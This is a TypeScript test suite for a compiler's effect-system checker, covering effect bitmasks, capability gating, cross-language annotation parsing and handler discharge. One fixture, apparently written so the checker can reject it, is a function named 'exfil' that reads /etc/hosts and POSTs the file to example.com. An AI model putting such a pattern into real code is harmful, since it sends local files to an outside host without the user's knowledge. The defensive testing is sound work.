/**
 * @file intersections/holo-compiler/effect-system.test.mts
 * @description `node:test` verification suite for `intersections/holo-compiler/effect-system.mts`.
 *
 * Covers:
 *   1. Canonical `EffectBit` bitmask <-> name & C11 `uint64_t` round-trips
 *   2. StealifyLang 7-tuple `ExecutionContext` -> allowed `EffectMask` capability gating
 *   3. Cross-language annotation parsing & implicit inference across C, Rust, Zig, WASI, and TS
 *   4. Pure functions passing cleanly across all 5 languages
 *   5. Undeclared `unsafe`, `io_fs`, `io_net`, `process_spawn` rejected with exact diagnostics
 *   6. Call-graph propagation + algebraic handler discharge (`EffectHandlerBinding` & `with_handler(...)`)
 *   7. Effect polymorphism (`<E>`) instantiation across caller/callee boundaries
 *
 * Strictly `erasableSyntaxOnly: true`.
 */

import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import type { ExecutionContext } from '../../packages/@awesome-os/stealify-schema/src/index.mts';
import { HOLO_COMPILER_CONTEXT } from './index.mts';
import {
  ALL_EFFECTS_MASK,
  EffectBit,
  checkModuleEffects,
  effectMaskToNames,
  effectMaskToU64,
  executionContextToAllowedEffects,
  extractDeclaredEffects,
  namesToEffectMask,
  u64ToEffectMask,
  type EffectHandlerBinding,
  type EffectModuleUnit,
} from './effect-system.mts';

function makeContext(overrides: Partial<ExecutionContext> = {}): ExecutionContext {
  return Object.freeze({
    boundary: overrides.boundary ?? 'in-process',
    display: overrides.display ?? 'headless',
    lifetime: overrides.lifetime ?? 'oneshot',
    transport: overrides.transport ?? 'arena-sab',
    capability: overrides.capability ?? Object.freeze({
      tenantId: 'test-tenant',
      scopes: Object.freeze(['holo.compile']),
      epoch: 1,
      privateData: false,
    }),
    locality: overrides.locality ?? 'local-arena',
    persona: overrides.persona ?? 'creator',
  });
}

describe('intersections/holo-compiler/effect-system', () => {
  it('round-trips canonical EffectBit bitmasks, names, and C11 uint64_t values', () => {
    assert.equal(EffectBit.PURE, 0);
    assert.equal(EffectBit.ALLOC, 1 << 0);
    assert.equal(EffectBit.IO_FS, 1 << 1);
    assert.equal(EffectBit.IO_NET, 1 << 2);
    assert.equal(EffectBit.ARENA_SAB, 1 << 3);
    assert.equal(EffectBit.UNSAFE_FFI, 1 << 4);
    assert.equal(EffectBit.ASYNC, 1 << 5);
    assert.equal(EffectBit.GPU_WGPU, 1 << 6);
    assert.equal(EffectBit.PROCESS_SPAWN, 1 << 7);

    assert.deepEqual(effectMaskToNames(EffectBit.PURE), ['pure']);
    assert.equal(namesToEffectMask(['pure']), EffectBit.PURE);

    const combined =
      EffectBit.ALLOC | EffectBit.IO_FS | EffectBit.ARENA_SAB | EffectBit.GPU_WGPU;
    const names = effectMaskToNames(combined);
    assert.deepEqual(names, ['alloc', 'io_fs', 'arena_sab', 'gpu_wgpu']);
    assert.equal(namesToEffectMask(names), combined);

    // Case-insensitive + alias support
    assert.equal(
      namesToEffectMask(['IO_FS', 'net', 'unsafe', 'spawn']),
      EffectBit.IO_FS | EffectBit.IO_NET | EffectBit.UNSAFE_FFI | EffectBit.PROCESS_SPAWN,
    );

    // Full mask round-trip through C11 uint64_t bigint
    const allNames = effectMaskToNames(ALL_EFFECTS_MASK);
    assert.equal(allNames.length, 8);
    assert.equal(namesToEffectMask(allNames), ALL_EFFECTS_MASK);
    const u64 = effectMaskToU64(ALL_EFFECTS_MASK);
    assert.equal(u64, 0xffn);
    assert.equal(u64ToEffectMask(u64), ALL_EFFECTS_MASK);

    assert.throws(() => namesToEffectMask(['nonexistent_effect']), RangeError);
  });

  it('derives exact allowed EffectMask from StealifyLang 7-tuple ExecutionContext', () => {
    // Default HOLO_COMPILER_CONTEXT: in-process, headless, arena-sab, scopes: [holo.compile, devops.observe]
    const holoAllowed = executionContextToAllowedEffects(HOLO_COMPILER_CONTEXT);
    assert.equal(
      holoAllowed,
      EffectBit.ALLOC | EffectBit.ARENA_SAB | EffectBit.ASYNC,
    );

    // WASI boundary enforces hard ceiling: no UNSAFE_FFI or PROCESS_SPAWN even with wildcard '*'
    const wasiCtx = makeContext({
      boundary: 'wasi',
      transport: 'os-pipe',
      capability: Object.freeze({
        tenantId: 'wasi-guest',
        scopes: Object.freeze(['*']),
        epoch: 1,
        privateData: false,
      }),
    });
    const wasiAllowed = executionContextToAllowedEffects(wasiCtx);
    assert.equal((wasiAllowed & EffectBit.UNSAFE_FFI), 0);
    assert.equal((wasiAllowed & EffectBit.PROCESS_SPAWN), 0);
    assert.notEqual((wasiAllowed & EffectBit.IO_FS), 0);
    assert.notEqual((wasiAllowed & EffectBit.ALLOC), 0);

    // Interactive foreground + external-http + explicit scopes
    const fgNetCtx = makeContext({
      boundary: 'host-win32',
      display: 'interactive-fg',
      transport: 'external-http',
      locality: 'sovereign-edge',
      capability: Object.freeze({
        tenantId: 'desktop-user',
        scopes: Object.freeze(['io.fs', 'process.spawn']),
        epoch: 2,
        privateData: false,
      }),
    });
    const fgNetAllowed = executionContextToAllowedEffects(fgNetCtx);
    assert.notEqual(fgNetAllowed & EffectBit.GPU_WGPU, 0);
    assert.notEqual(fgNetAllowed & EffectBit.IO_NET, 0);
    assert.notEqual(fgNetAllowed & EffectBit.IO_FS, 0);
    assert.notEqual(fgNetAllowed & EffectBit.PROCESS_SPAWN, 0);
    assert.equal(fgNetAllowed & EffectBit.UNSAFE_FFI, 0);

    // Data sovereignty: privateData + local-arena strips IO_NET even if scope/transport requests it
    const privateLocalCtx = makeContext({
      boundary: 'in-process',
      transport: 'external-http',
      locality: 'local-arena',
      capability: Object.freeze({
        tenantId: 'vault',
        scopes: Object.freeze(['io.net', 'io.fs']),
        epoch: 1,
        privateData: true,
      }),
    });
    const privateAllowed = executionContextToAllowedEffects(privateLocalCtx);
    assert.equal(privateAllowed & EffectBit.IO_NET, 0);
    assert.notEqual(privateAllowed & EffectBit.IO_FS, 0);
  });

  it('passes pure functions across C, Rust, Zig, WASI, and TypeScript', () => {
    const units: readonly EffectModuleUnit[] = [
      {
        unitId: 'c_pure_hash',
        toolchain: 'cxx',
        source: [
          '/* @holo-effect: pure */',
          'uint32_t fnv1a(uint32_t h, uint32_t b) { return (h ^ b) * 16777619u; }',
        ].join('\n'),
      },
      {
        unitId: 'rust_pure_math',
        toolchain: 'rust',
        source: [
          '#[holo::effect(pure)]',
          'pub fn clamp_u32(v: u32, lo: u32, hi: u32) -> u32 { v.max(lo).min(hi) }',
        ].join('\n'),
      },
      {
        unitId: 'zig_pure_crc',
        toolchain: 'zig',
        source: [
          '/// @holo-effect: pure',
          'pub fn xor_fold(a: u32, b: u32) u32 { return a ^ b; }',
        ].join('\n'),
      },
      {
        unitId: 'wasi_pure_ring',
        toolchain: 'wasi',
        source: [
          '// Pure ring math (comments mentioning fetch() or unsafe { must not false-positive)',
          'pub fn ring_avail(head: u32, tail: u32) -> u32 { head - tail }',
        ].join('\n'),
      },
      {
        unitId: 'ts_pure_sum',
        toolchain: 'ts',
        source: [
          '// @holo-effect: pure',
          'export function add(a: number, b: number): number { return a + b; }',
        ].join('\n'),
      },
    ];

    const result = checkModuleEffects(units, HOLO_COMPILER_CONTEXT);
    assert.equal(result.ok, true);
    assert.equal(result.diagnostics.length, 0);
    for (const unit of units) {
      const summary = result.unitSummaries[unit.unitId]!;
      assert.equal(summary.isPure, true);
      assert.equal(summary.effectiveMask, EffectBit.PURE);
      assert.deepEqual(summary.effectiveEffects, ['pure']);
    }
  });

  it('rejects undeclared unsafe, fs, and net primitives across languages with exact diagnostics', () => {
    const units: readonly EffectModuleUnit[] = [
      {
        unitId: 'rust_undeclared_unsafe',
        toolchain: 'rust',
        source: [
          '#[holo::effect(pure)]',
          'pub fn raw_poke(p: *mut u8) { unsafe { *p = 1; } }',
        ].join('\n'),
      },
      {
        unitId: 'ts_undeclared_fs_net',
        toolchain: 'ts',
        source: [
          'export async function exfil() {',
          '  const data = fs.readFileSync("/etc/hosts", "utf8");',
          '  return await fetch("https://example.com", { method: "POST", body: data });',
          '}',
        ].join('\n'),
      },
      {
        unitId: 'zig_undeclared_fs',
        toolchain: 'zig',
        source: [
          'pub fn loadConfig() !void {',
          '  const f = try std.fs.cwd().openFile("config.json", .{});',
          '  defer f.close();',
          '}',
        ].join('\n'),
      },
      {
        unitId: 'c_undeclared_dlopen',
        toolchain: 'cxx',
        source: [
          'void* load_plugin(const char* p) { return dlopen(p, 1); }',
        ].join('\n'),
      },
    ];

    const result = checkModuleEffects(units, HOLO_COMPILER_CONTEXT);
    assert.equal(result.ok, false);

    // Rust undeclared unsafe + forbidden by HOLO_COMPILER_CONTEXT
    const rustUndeclared = result.diagnostics.find(
      (d) => d.unitId === 'rust_undeclared_unsafe' && d.code === 'HOLO_EFF_UNDECLARED',
    );
    assert.ok(rustUndeclared);
    assert.deepEqual(rustUndeclared.undeclaredEffects, ['unsafe_ffi']);
    assert.match(rustUndeclared.remediation, /#\[holo::effect\(unsafe_ffi\)\]/);

    const rustForbidden = result.diagnostics.find(
      (d) => d.unitId === 'rust_undeclared_unsafe' && d.code === 'HOLO_EFF_FORBIDDEN_BY_CONTEXT',
    );
    assert.ok(rustForbidden);
    assert.deepEqual(rustForbidden.forbiddenByContext, ['unsafe_ffi']);

    // TS undeclared io_fs, io_net, async; forbidden io_fs, io_net
    const tsUndeclared = result.diagnostics.find(
      (d) => d.unitId === 'ts_undeclared_fs_net' && d.code === 'HOLO_EFF_UNDECLARED',
    );
    assert.ok(tsUndeclared);
    assert.deepEqual(tsUndeclared.undeclaredEffects, ['io_fs', 'io_net', 'async']);

    const tsForbidden = result.diagnostics.find(
      (d) => d.unitId === 'ts_undeclared_fs_net' && d.code === 'HOLO_EFF_FORBIDDEN_BY_CONTEXT',
    );
    assert.ok(tsForbidden);
    assert.deepEqual(tsForbidden.forbiddenByContext, ['io_fs', 'io_net']);

    // Zig undeclared io_fs
    const zigUndeclared = result.diagnostics.find(
      (d) => d.unitId === 'zig_undeclared_fs' && d.code === 'HOLO_EFF_UNDECLARED',
    );
    assert.ok(zigUndeclared);
    assert.deepEqual(zigUndeclared.undeclaredEffects, ['io_fs']);

    // C undeclared dlopen -> unsafe_ffi
    const cUndeclared = result.diagnostics.find(
      (d) => d.unitId === 'c_undeclared_dlopen' && d.code === 'HOLO_EFF_UNDECLARED',
    );
    assert.ok(cUndeclared);
    assert.deepEqual(cUndeclared.undeclaredEffects, ['unsafe_ffi']);
  });

  it('propagates effects across call graphs and discharges them via algebraic handlers', () => {
    const units: readonly EffectModuleUnit[] = [
      {
        unitId: 'fs_reader',
        toolchain: 'ts',
        source: [
          '// @holo-effect: io_fs',
          'export function readManifest() { return fs.readFileSync("manifest.json", "utf8"); }',
        ].join('\n'),
      },
      {
        unitId: 'orchestrator_unhandled',
        toolchain: 'ts',
        source: [
          '// @holo-effect: pure',
          'export function runUnhandled() { return readManifest(); }',
        ].join('\n'),
        calls: ['fs_reader'],
      },
      {
        unitId: 'orchestrator_handled_binding',
        toolchain: 'ts',
        source: [
          '// @holo-effect: pure',
          'export function runWithMockFs() { return readManifest(); }',
        ].join('\n'),
        calls: ['fs_reader'],
      },
      {
        unitId: 'orchestrator_handled_inline',
        toolchain: 'rust',
        source: [
          '#[holo::effect(arena_sab)]',
          'pub fn run_inline_handler() {',
          '  let _buf = B8G_ARENA_V1;',
          '  with_handler(IO_FS);',
          '}',
        ].join('\n'),
        calls: ['fs_reader'],
      },
    ];

    const fsAllowedCtx = makeContext({
      capability: Object.freeze({
        tenantId: 'builder',
        scopes: Object.freeze(['holo.compile', 'io.fs']),
        epoch: 1,
        privateData: false,
      }),
    });

    const handlers: readonly EffectHandlerBinding[] = [
      {
        callerUnitId: 'orchestrator_handled_binding',
        calleeUnitId: 'fs_reader',
        handles: EffectBit.IO_FS,
      },
    ];

    const result = checkModuleEffects(units, fsAllowedCtx, handlers);
    assert.equal(result.ok, false);

    // Unhandled caller MUST fail with propagated io_fs
    assert.equal(result.diagnostics.length, 1);
    assert.equal(result.diagnostics[0]!.unitId, 'orchestrator_unhandled');
    assert.equal(result.diagnostics[0]!.code, 'HOLO_EFF_UNDECLARED');
    assert.deepEqual(result.diagnostics[0]!.undeclaredEffects, ['io_fs']);

    // Binding-handled caller discharges IO_FS cleanly -> pure
    const bindingSummary = result.unitSummaries['orchestrator_handled_binding']!;
    assert.equal(bindingSummary.isPure, true);
    assert.equal(bindingSummary.dischargedMask, EffectBit.IO_FS);

    // Inline `with_handler(IO_FS)` caller discharges IO_FS and retains declared ARENA_SAB
    const inlineSummary = result.unitSummaries['orchestrator_handled_inline']!;
    assert.equal(inlineSummary.effectiveMask, EffectBit.ARENA_SAB);
    assert.equal(inlineSummary.dischargedMask, EffectBit.IO_FS);
  });

  it('supports <E> effect polymorphism across polyglot caller/callee boundaries', () => {
    const units: readonly EffectModuleUnit[] = [
      {
        unitId: 'poly_map',
        toolchain: 'rust',
        source: [
          '#[holo::effect(alloc, <E>)]',
          'pub fn map_items<E>(n: usize) -> Vec<u8> { Vec::new() }',
        ].join('\n'),
      },
      {
        unitId: 'caller_with_sab',
        toolchain: 'ts',
        source: [
          '// @holo-effect: alloc, arena_sab',
          'export function runWithArena() { return map_items(16); }',
        ].join('\n'),
        calls: ['poly_map'],
        polymorphicBindings: {
          poly_map: EffectBit.ARENA_SAB,
        },
      },
      {
        unitId: 'caller_forgets_bound_effect',
        toolchain: 'ts',
        source: [
          '// @holo-effect: alloc',
          'export function runMissingNet() { return map_items(16); }',
        ].join('\n'),
        calls: ['poly_map'],
        polymorphicBindings: {
          poly_map: EffectBit.IO_NET,
        },
      },
    ];

    const netCtx = makeContext({
      transport: 'external-http',
      locality: 'sovereign-edge',
      capability: Object.freeze({
        tenantId: 'poly-test',
        scopes: Object.freeze(['holo.compile', 'arena.sab', 'io.net']),
        epoch: 1,
        privateData: false,
      }),
    });

    const extractedPoly = extractDeclaredEffects('rust', units[0]!.source);
    assert.deepEqual(extractedPoly.polymorphicVars, ['E']);
    assert.equal(extractedPoly.declaredMask, EffectBit.ALLOC);

    const result = checkModuleEffects(units, netCtx);
    assert.equal(result.ok, false);

    // `caller_with_sab` declared `alloc, arena_sab` -> passes
    assert.equal(
      result.diagnostics.some((d) => d.unitId === 'caller_with_sab'),
      false,
    );
    assert.equal(
      result.unitSummaries['caller_with_sab']!.effectiveMask,
      EffectBit.ALLOC | EffectBit.ARENA_SAB,
    );

    // `caller_forgets_bound_effect` bound `<E> = IO_NET` without declaring `io_net` -> rejected
    const diag = result.diagnostics.find(
      (d) => d.unitId === 'caller_forgets_bound_effect' && d.code === 'HOLO_EFF_UNDECLARED',
    );
    assert.ok(diag);
    assert.deepEqual(diag.undeclaredEffects, ['io_net']);
  });

  it('flags unknown effect annotations cleanly', () => {
    const ext = extractDeclaredEffects(
      'ts',
      '// @holo-effect: io_fs, quantum_teleport\nexport const x = fs.existsSync("a");',
    );
    assert.deepEqual(ext.unknownAnnotations, ['quantum_teleport']);
    assert.equal(ext.declaredMask, EffectBit.IO_FS);

    const res = checkModuleEffects(
      [
        {
          unitId: 'bad_ann',
          toolchain: 'ts',
          source: '// @holo-effect: quantum_teleport\nexport const x = 1;',
        },
      ],
      HOLO_COMPILER_CONTEXT,
    );
    assert.equal(res.ok, false);
    assert.equal(res.diagnostics[0]!.code, 'HOLO_EFF_UNKNOWN_ANNOTATION');
  });

  it('infers SharedArrayBuffer, spawn(), wgpu, and enforces WASI ceiling + handler residualEffects', () => {
    const tsSab = extractDeclaredEffects(
      'ts',
      '// @holo-effect: arena_sab\nexport const buf = new SharedArrayBuffer(4096);',
    );
    assert.equal(tsSab.declaredMask, EffectBit.ARENA_SAB);
    assert.equal(tsSab.inferredMask, EffectBit.ARENA_SAB);

    const tsSpawn = extractDeclaredEffects(
      'ts',
      'export function run() { return spawn("ls", ["-la"]); }',
    );
    assert.equal(tsSpawn.inferredMask, EffectBit.PROCESS_SPAWN);

    const rustGpu = extractDeclaredEffects(
      'rust',
      '#[holo::effect(gpu_wgpu)]\npub fn dispatch() { let _i = wgpu::Instance::default(); }',
    );
    assert.equal(rustGpu.declaredMask, EffectBit.GPU_WGPU);
    assert.equal(rustGpu.inferredMask, EffectBit.GPU_WGPU);

    // WASI unit declaring unsafe_ffi is rejected by WASI boundary ceiling even with '*' scope
    const wasiCtx = makeContext({
      boundary: 'wasi',
      capability: Object.freeze({
        tenantId: 'wasi',
        scopes: Object.freeze(['*']),
        epoch: 1,
        privateData: false,
      }),
    });
    const wasiCheck = checkModuleEffects(
      [
        {
          unitId: 'wasi_bad_ffi',
          toolchain: 'wasi',
          source: '// @holo-effect: unsafe_ffi\nvoid* f() { return dlopen("x.so", 1); }',
        },
      ],
      wasiCtx,
    );
    assert.equal(wasiCheck.ok, false);
    assert.equal(wasiCheck.diagnostics[0]!.code, 'HOLO_EFF_FORBIDDEN_BY_CONTEXT');
    assert.deepEqual(wasiCheck.diagnostics[0]!.forbiddenByContext, ['unsafe_ffi']);

    // Handler with residualEffects: discharges IO_FS but introduces ARENA_SAB
    const residualCheck = checkModuleEffects(
      [
        {
          unitId: 'leaf_fs',
          toolchain: 'ts',
          source: '// @holo-effect: io_fs\nexport const read = () => fs.readFileSync("a");',
        },
        {
          unitId: 'caller_sab',
          toolchain: 'ts',
          source: '// @holo-effect: arena_sab\nexport const run = () => read();',
          calls: ['leaf_fs'],
        },
      ],
      makeContext({
        capability: Object.freeze({
          tenantId: 't',
          scopes: Object.freeze(['holo.compile', 'io.fs']),
          epoch: 1,
          privateData: false,
        }),
      }),
      [
        {
          callerUnitId: 'caller_sab',
          calleeUnitId: 'leaf_fs',
          handles: EffectBit.IO_FS,
          residualEffects: EffectBit.ARENA_SAB,
        },
      ],
    );
    assert.equal(residualCheck.ok, true);
    assert.equal(
      residualCheck.unitSummaries['caller_sab']!.effectiveMask,
      EffectBit.ARENA_SAB,
    );
  });
});
